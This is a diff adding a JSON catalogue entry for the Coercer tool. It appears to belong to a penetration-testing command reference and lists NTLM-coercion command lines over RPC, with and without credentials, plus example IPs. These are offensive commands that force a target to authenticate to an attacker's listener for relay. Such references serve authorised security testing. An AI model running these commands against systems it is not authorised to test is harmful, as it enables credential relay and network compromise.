@@ -1,0 +1,32 @@
+{
+  "id": "coercer",
+  "name": "Coercer",
+  "command": "python3 Coercer.py coerce -l <listener_ip> -t <target_ip>",
+  "description": "Coerce NTLM authentication using multiple RPC protocols",
+  "platform": "linux",
+  "requires": [
+    "no-creds"
+  ],
+  "protocols": [
+    "rpc",
+    "ntlm"
+  ],
+  "tags": [
+    "coercer",
+    "coercion",
+    "ntlm",
+    "relay",
+    "rpc"
+  ],
+  "variations": [
+    {
+      "label": "With Credentials",
+      "requires": "password",
+      "command": "python3 Coercer.py coerce -l <listener_ip> -t <target_ip> -u '<user>' -p '<password>' -d '<domain>'"
+    }
+  ],
+  "examples": [
+    "python3 Coercer.py coerce -l 192.168.1.50 -t 192.168.1.100",
+    "python3 Coercer.py coerce -l 192.168.1.50 -t 192.168.1.100 -u 'user' -p 'password' -d 'corp.local'"
+  ]
+}
